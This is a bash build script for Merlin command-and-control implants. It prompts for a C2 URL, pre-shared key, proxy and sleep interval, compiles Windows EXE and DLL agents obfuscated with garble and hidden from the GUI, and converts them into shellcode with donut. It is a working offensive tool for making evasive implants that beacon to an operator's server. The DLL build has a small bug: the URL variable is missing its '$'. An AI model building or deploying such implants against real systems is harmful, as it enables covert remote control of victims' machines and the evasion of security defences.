#!/bin/bash


func_Build_merlin_Agent(){
  # https://merlin-c2.readthedocs.io/en/latest/agent/custom.html
  echo "[!] Leave any of these questions below blank to not do it in the merlin build."
  read -r -p "Enter compiled file name: " Filename
  read -r -p "Enter protocol to use (http,https,http3,quic,h2,h2c): " ARG_PROTO
  read -r -p "Enter c2 URL (http(s)://{Domain/IP}:{PORT} optional http(s)://{Domain/IP}:{PORT}/{1 URI}): " ARG_URL
  read -r -p "Enter User-Agent-String to use: " useragent
  read -r -p "Enter Host header (CDN redir required): " Host
  read -r -p "Enter PSK (Must be same for implant and c2 server): " ARG_PSK
  read -r -p "Enter proxy: " ARG_PROXY
  read -r -p "Enter sleep setting (ie 1s 1m): " ARG_SLEEP
  echo ""
  echo "[!] Setting displayed below:"
  echo "Filename (no extension): "$Filename
  echo "Protocol: "$ARG_PROTO
  echo "URI: "$ARG_URL
  echo "Host: "$Host
  echo "PSK: "$ARG_PSK
  echo "Proxy: "$ARG_PROXY
  echo "Sleep: "$ARG_SLEEP
  echo "User Agent: "$useragent
  echo ""
  read -r -p "Do you want build agent with settings above y==yes r==redo any other key or blank is to cancel?[y/r]" response
  case "$response" in
        [yY][eE][sS]|[yY])
  cd /opt/merlin-agent
  echo "[*] Building EXE agents in Docker"
  go mod download github.com/Ne0nd0g/merlin-agent
  go mod download github.com/Ne0nd0g/merlin
  export GOOS=windows GOARCH=amd64;garble -tiny build -trimpath -ldflags "-s -w -X main.build=bdf7a31107e196854b524fd7d3ae8440c169412d -X github.com/lunarobliq/merlin-agent/agent.build=bdf7a31107e196854b524fd7d3ae8440c169412d -X main.protocol=$ARG_PROTO -X main.url=$ARG_URL -X main.host=$Host -X main.psk=$ARG_PSK -X main.proxy=$ARG_PROXY -X main.sleep=$ARG_SLEEP -X main.useragent=$useragent -H=windowsgui -buildid=" -gcflags=all=-trimpath=/go -asmflags=all=-trimpath=/go -o /opt/artifacts/$Filename.exe ./main.go
  echo "[*] Building DLL agents in Docker"
  cd /opt/merlin-agent-dll
  export GOOS=windows GOARCH=amd64 CC=x86_64-w64-mingw32-gcc CXX=x86_64-w64-mingw32-g++ CGO_ENABLED=1;garble -tiny build -ldflags "-s -w -X main.build=8b17d8559377825a091ce89b94a224c76e40c56f -X github.com/lunarobliq/merlin/pkg/agent.build=8b17d8559377825a091ce89b94a224c76e40c56f -X main.protocol=$ARG_PROTO -X main.url=ARG_URL -X main.host=$Host -X main.psk=$ARG_PSK -X main.proxy=$ARG_PROXY -X main.sleep=$ARG_SLEEP -buildid=" -gcflags=all=-trimpath=/go -asmflags=all=-trimpath=/go -buildmode=c-archive -o main.a main.go; x86_64-w64-mingw32-gcc -shared -pthread -o /opt/artifacts/$Filename.dll merlin.c main.a -lwinmm -lntdll -lws2_32
  /opt/donut/donut -a 2 -f 1 -o /opt/artifacts/donut_$Filename.bin /opt/artifacts/$Filename.exe
  /opt/donut/donut -a 2 -f 1 -o /opt/artifacts/donut_$Filename.bin /opt/artifacts/$Filename.dll
  echo "[*] Build Done"
  ;;
    [rR])
    func_Build_merlin_Agent
  ;;
    esac
  read -n 1 -s -r -p "Press any key to continue...."
}

func_Build_merlin_Agent
echo "Filename is: "$Filename
